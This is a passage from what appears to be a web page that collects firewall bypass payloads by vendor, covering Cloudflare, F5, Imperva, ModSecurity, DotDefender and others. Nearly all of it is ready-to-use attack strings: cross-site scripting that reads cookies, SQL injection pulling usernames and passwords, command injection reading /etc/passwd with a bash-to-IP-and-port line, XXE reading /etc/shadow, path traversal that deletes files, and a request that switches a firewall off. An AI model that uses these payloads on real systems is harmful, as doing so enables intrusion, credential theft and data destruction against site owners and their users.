<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST host.com HTTP/1.1</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)</span><br><span class="line"></span><br><span class="line">author=1</span><br></pre></td></tr></table></figure>

<p>Protected Admin Scripts Bypass by @ed0x21son</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://host/wp-admin///load-scripts.php?load%5B%5D=jquery-core,jquery-migrate,utils</span><br><span class="line">http://host/wp-admin///load-styles.php?load%5B%5D=dashicons,admin-bar</span><br></pre></td></tr></table></figure>

<p>REST API Disable Bypass by @ed0x21son</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/index.php/wp-json/wp/v2/users/</span><br></pre></td></tr></table></figure>

<h3 id="Citrix-NetScaler"><a href="#Citrix-NetScaler" class="headerlink" title="Citrix NetScaler"></a><strong>Citrix NetScaler</strong></h3><p>SQLi via HTTP Parameter Pollution (NS10.5) by @BGA Security</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:tem=&quot;http://tempuri.org/&quot;&gt;</span><br><span class="line">   &lt;soapenv:Header/&gt;</span><br><span class="line">   &lt;soapenv:Body&gt;</span><br><span class="line">        &lt;string&gt;’ union select current_user, 2#&lt;/string&gt;</span><br><span class="line">    &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line">generic_api_call.pl XSS by @NNPoster</span><br><span class="line">http://host/ws/generic_api_call.pl?function=statns&amp;standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e</span><br></pre></td></tr></table></figure>



<p>```**Cloudflare**`</p>
<p>HTML Injection by @spyerror</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background:url(/f#&amp;#127;oo/;color:red/*/foo.jpg);&quot;&gt;X</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @c0d3g33k</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a+HREF=&#x27;javascrip%26%239t:alert%26lpar;document.domain)&#x27;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypasses by @Bohdan Korzhynskyi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=prompt%26%230000000040document.domain)&gt;</span><br><span class="line">&lt;svg onload=prompt%26%23x000000028;document.domain)&gt;</span><br><span class="line">xss&#x27;&quot;&gt;&lt;iframe srcdoc=&#x27;%26lt;script&gt;;prompt`$&#123;document.domain&#125;`%26lt;/script&gt;&#x27;&gt;</span><br><span class="line">1&#x27;&quot;&gt;&lt;img/src/onerror=.1|alert``&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @RakeshMane10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#00116&amp;#40&amp;#41&amp;#x2f&amp;#x2f</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @ArbazKiraak</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;NewLine;ri&amp;Tab;pt&amp;colon;\u0061\u006C\u0065\u0072\u0074&amp;lpar;this[&#x27;document&#x27;][&#x27;cookie&#x27;]&amp;rpar;&quot;&gt;X&lt;/a&gt;`</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Ahmet Ümit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;--`&lt;img/src=` onerror=confirm``&gt; --!&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Shiva Krishna</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:&#123;alert`0`&#125;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Brute Logic</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=//knoxss.me?</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @RenwaX23 (Chrome only)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;j id=x style=&quot;-webkit-user-modify:read-write&quot; onfocus=&#123;window.onerror=eval&#125;throw/0/+name&gt;H&lt;/j&gt;#x</span><br></pre></td></tr></table></figure>

<p>RCE Payload Detection Bypass by @theMiddle</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat$u+/etc$u/passwd$u</span><br><span class="line">/bin$u/bash$u &lt;ip&gt; &lt;port&gt;</span><br><span class="line">&quot;;cat+/etc/passwd+#</span><br></pre></td></tr></table></figure>

<h3 id="Comodo"><a href="#Comodo" class="headerlink" title="Comodo"></a><strong>Comodo</strong></h3><p>XSS Bypass by @0xInfection</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input/oninput=&#x27;new Function`confir\u006d\`0\``&#x27;&gt;</span><br><span class="line">&lt;p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True&gt;dragme</span><br></pre></td></tr></table></figure>

<p>SQLi by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union/**/select 1,version(),@@datadir</span><br></pre></td></tr></table></figure>

<h3 id="DotDefender"><a href="#DotDefender" class="headerlink" title="DotDefender"></a>DotDefender</h3><p>Firewall disable by (v5.0) by @hyp3rlinx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+</span><br><span class="line">&lt;enabled&gt;false&lt;/enabled&gt;</span><br></pre></td></tr></table></figure>

<p>Remote Command Execution (v3.8-5) by @John Dos</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /dotDefender/index.cgi HTTP/1.1</span><br><span class="line">Host: 172.16.159.132</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-us,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7</span><br><span class="line">Keep-Alive: 300</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Authorization: Basic YWRtaW46</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 95</span><br><span class="line"></span><br><span class="line">sitename=dotdefeater&amp;deletesitename=dotdefeater;id;ls -al ../;pwd;&amp;action=deletesite&amp;linenum=15</span><br></pre></td></tr></table></figure>

<p>Persistent XSS (v4.0) by @EnableSecurity</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /c?a=&lt;script&gt; HTTP/1.1</span><br><span class="line">Host: 172.16.159.132</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US;</span><br><span class="line">rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-us,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;: aa</span><br><span class="line">Keep-Alive: 300</span><br></pre></td></tr></table></figure>

<p>R-XSS Bypass by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=prompt(1);&gt;</span><br><span class="line">&lt;isindex action=&quot;javas&amp;tab;cript:alert(1)&quot; type=image&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(2)&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @0xInfection</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;p draggable=True ondragstart=prompt()&gt;alert</span><br><span class="line">&lt;bleh/ondragstart=&amp;Tab;parent&amp;Tab;[&#x27;open&#x27;]&amp;Tab;&amp;lpar;&amp;rpar;%20draggable=True&gt;dragme</span><br><span class="line">GET - XSS Bypass (v4.02) by @DavidK</span><br><span class="line"></span><br><span class="line">/search?q=%3Cimg%20src=%22WTF%22%20onError=alert(/0wn3d/.source)%20/%3E</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;WTF&quot; onError=&quot;&#123;var</span><br><span class="line">&#123;3:s,2:h,5:a,0:v,4:n,1:e&#125;=&#x27;earltv&#x27;&#125;[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2B</span><br><span class="line">h%2Bn)(/0wn3d/.source)&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>POST - XSS Bypass (v4.02) by @DavidK</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;WTF&quot; onError=&quot;&#123;var</span><br><span class="line">&#123;3:s,2:h,5:a,0:v,4:n,1:e&#125;=&#x27;earltv&#x27;&#125;[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/</span><br><span class="line">.source)&quot; /&gt;</span><br><span class="line">clave XSS (v4.02) by @DavidK</span><br><span class="line">/?&amp;idPais=3&amp;clave=%3Cimg%20src=%22WTF%22%20onError=%22&#123;</span><br></pre></td></tr></table></figure>

<h3 id="Fortinet-Fortiweb"><a href="#Fortinet-Fortiweb" class="headerlink" title="Fortinet Fortiweb"></a><strong>Fortinet Fortiweb</strong></h3><p><code>pcre_expression</code> unvaidated XSS by @Benjamin Mejri</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/waf/pcre_expression/validate?redir=/success&amp;mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C</span><br><span class="line">/waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&amp;mkey=0</span><br></pre></td></tr></table></figure>

<p>CSP Bypass by @Binar10</p>
<p>POST Type Query</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /&lt;path&gt;/login-app.aspx HTTP/1.1</span><br><span class="line">Host: &lt;host&gt;</span><br><span class="line">User-Agent: &lt;any valid user agent string&gt;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: &lt;the content length must be at least 2399 bytes&gt;</span><br><span class="line"></span><br><span class="line">var1=datavar1&amp;var2=datavar12&amp;pad=&lt;random data to complete at least 2399 bytes&gt;</span><br></pre></td></tr></table></figure>

<p>GET Type Query</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;domain&gt;/path?var1=vardata1&amp;var2=vardata2&amp;pad=&lt;large arbitrary data&gt;</span><br></pre></td></tr></table></figure>

<h3 id="F5-ASM"><a href="#F5-ASM" class="headerlink" title="F5 ASM"></a><strong>F5 ASM</strong></h3><p>XSS Bypass by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;javascript:alert(1)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&quot;/&gt;&lt;marquee onfinish=confirm(123)&gt;a&lt;/marquee&gt;</span><br></pre></td></tr></table></figure>

<h3 id="F5-BIG-IP"><a href="#F5-BIG-IP" class="headerlink" title="F5 BIG-IP"></a><strong>F5 BIG-IP</strong></h3><p>XSS Bypass by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;body style=&quot;height:1000px&quot; onwheel=&quot;[DATA]&quot;&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;[DATA]&quot;&gt;</span><br><span class="line">&lt;body style=&quot;height:1000px&quot; onwheel=&quot;prom%25%32%33%25%32%36x70;t(1)&quot;&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;prom%25%32%33%25%32%36x70;t(1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Aatif Khan</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body style=&quot;height:1000px&quot; onwheel=&quot;prom%25%32%33%25%32%36x70;t(1)&quot;&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot;onshow=&quot;prom%25%32%33%25%32%36x70;t(1)“&gt;</span><br></pre></td></tr></table></figure>

<p><code>report_type</code> XSS by @NNPoster</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+</span><br></pre></td></tr></table></figure>

<p>POST Based XXE by @Anonymous</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /sam/admin/vpe2/public/php/server.php HTTP/1.1</span><br><span class="line">Host: bigip</span><br><span class="line">Cookie: BIGIPAuthCookie=*VALID_COOKIE*</span><br><span class="line">Content-Length: 143</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&#x27;utf-8&#x27; ?&gt;</span><br><span class="line">&lt;!DOCTYPE a [&lt;!ENTITY e SYSTEM &#x27;/etc/shadow&#x27;&gt; ]&gt;</span><br><span class="line">&lt;message&gt;&lt;dialogueType&gt;&amp;e;&lt;/dialogueType&gt;&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p>Directory Traversal by @Anastasios Monachos</p>
<p>Read Arbitrary File</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&amp;name=../../../../../etc/passwd</span><br><span class="line">Delete Arbitrary File</span><br><span class="line">POST /tmui/Control/form HTTP/1.1</span><br><span class="line">Host: site.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: JSESSIONID=6C6BADBEFB32C36CDE7A59C416659494; f5advanceddisplay=&quot;&quot;; BIGIPAuthCookie=89C1E3BDA86BDF9E0D64AB60417979CA1D9BE1D4; BIGIPAuthUsernameCookie=admin; F5_CURRENT_PARTITION=Common; f5formpage=&quot;/tmui/system/archive/properties.jsp?&amp;name=../../../../../etc/passwd&quot;; f5currenttab=&quot;main&quot;; f5mainmenuopenlist=&quot;&quot;; f5_refreshpage=/tmui/Control/jspmap/tmui/system/archive/properties.jsp%3Fname%3D../../../../../etc/passwd</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">_form_holder_opener_=&amp;handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;handler_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;showObjList=&amp;showObjList_before=&amp;hideObjList=&amp;hideObjList_before=&amp;enableObjList=&amp;enableObjList_before=&amp;disableObjList=&amp;disableObjList_before=&amp;_bufvalue=icHjvahr354NZKtgQXl5yh2b&amp;_bufvalue_before=icHjvahr354NZKtgQXl5yh2b&amp;_bufvalue_validation=NO_VALIDATION&amp;com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;linked_add_id=&amp;linked_add_id_before=&amp;name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;name_before=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;form_page=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&amp;form_page_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&amp;download_before=Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;restore_before=Restore&amp;delete=Delete&amp;delete_before=Delete</span><br></pre></td></tr></table></figure>

<h3 id="F5-FirePass"><a href="#F5-FirePass" class="headerlink" title="F5 FirePass"></a><strong>F5 FirePass</strong></h3><p>SQLi Bypass from @Anonymous</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">state=%2527+and+</span><br><span class="line">(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+</span><br><span class="line">BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+</span><br></pre></td></tr></table></figure>

<h3 id="ModSecurity"><a href="#ModSecurity" class="headerlink" title="ModSecurity"></a><strong>ModSecurity</strong></h3><p>RCE Payloads Detection Bypass for PL3 by @theMiddle (v3.1)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;+$u+cat+/etc$u/passwd$u</span><br></pre></td></tr></table></figure>

<p>RCE Payloads Detection Bypass for PL2 by @theMiddle (v3.1)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;+$u+cat+/etc$u/passwd+\#</span><br></pre></td></tr></table></figure>

<p>RCE Payloads for PL1 and PL2 by @theMiddle (v3.0)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/??t+/???/??ss??</span><br></pre></td></tr></table></figure>

<p>RCE Payloads for PL3 by @theMiddle (v3.0)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?in/cat+/et?/passw?</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @Johannes Dahse (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @Yuri Goltsev (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND (select DCount(last(username)&amp;after=1&amp;after=1) from users where username=&#x27;ad1min&#x27;)</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @Ahmad Maulana (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-</span><br><span class="line">SQLi Bypass by @Travis Lee (v2.2)</span><br><span class="line">amUserId=1 union select username,password,3,4 from users</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @Roberto Salgado (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @Georgi Geshev (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%0bAND(SELECT%0b1%20FROM%20mysql.x)</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @SQLMap Devs (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @HackPlayers (v2.2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201</span><br></pre></td></tr></table></figure>

<h3 id="Imperva"><a href="#Imperva" class="headerlink" title="Imperva"></a><strong>Imperva</strong></h3><p>Imperva SecureSphere 13 - Remote Command Execution by @rsp3ar</p>
<p>XSS Bypass by @David Y</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload\r\n=$.globalEval(&quot;al&quot;+&quot;ert()&quot;);&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Emad Shanab</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=self[`aler`%2b`t`]`1`&gt;</span><br><span class="line">anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @i_bo0om</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;javas&amp;Tab;cript:al&quot;+&quot;ert``&quot;&#x27;;&gt;</span><br><span class="line">&lt;img/src=q onerror=&#x27;new Function`al\ert\`1\``&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @c0d3g33k</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&#x27;data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @DRK1WI</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15 and &#x27;1&#x27;=(SELECT &#x27;1&#x27; FROM dual) and &#x27;0having&#x27;=&#x27;0having&#x27;</span><br></pre></td></tr></table></figure>

<p>SQLi by @Giuseppe D’Amore</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stringindatasetchoosen%%&#x27; and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like &#x27;%%dministrator&#x27; and rownum&lt;=1 and PASSWORD like &#x27;0%&#x27;) and &#x27;1%%&#x27;=&#x27;1</span><br><span class="line">Imperva SecureSphere &lt;= v13 - Privilege Escalation by @0x09AL</span><br></pre></td></tr></table></figure>

<h3 id="Kona-SiteDefender"><a href="#Kona-SiteDefender" class="headerlink" title="Kona SiteDefender"></a><strong>Kona SiteDefender</strong></h3><p>HTML Injection by @sp1d3rs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2522%253E%253Csvg%2520height%3D%2522100%2522%2520width%3D%2522100%2522%253E%2520%253Ccircle%2520cx%3D%252250%2522%2520cy%3D%252250%2522%2520r%3D%252240%2522%2520stroke%3D%2522black%2522%2520stroke-width%3D%25223%2522%2520fill%3D%2522red%2522%2520%2F%253E%2520%253C%2Fsvg%253E</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Jonathan Bouman</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body%20alt=al%20lang=ert%20onmouseenter=&quot;top[&#x27;al&#x27;+lang](/PoC%20XSS%20Bypass%20by%20Jonathan%20Bouman/)&quot;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @zseano</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&quot;&gt;&lt;/script&gt;&lt;base%20c%3D=href%3Dhttps:\mysite&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @0xInfection</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;abc/onmouseenter=confirm%60%60&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @sp1d3rs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2522%253E%253C%2Fdiv%253E%253C%2Fdiv%253E%253Cbrute%2520onbeforescriptexecute%3D%2527confirm%28document.domain%29%2527%253E</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Frans Rosén</p>
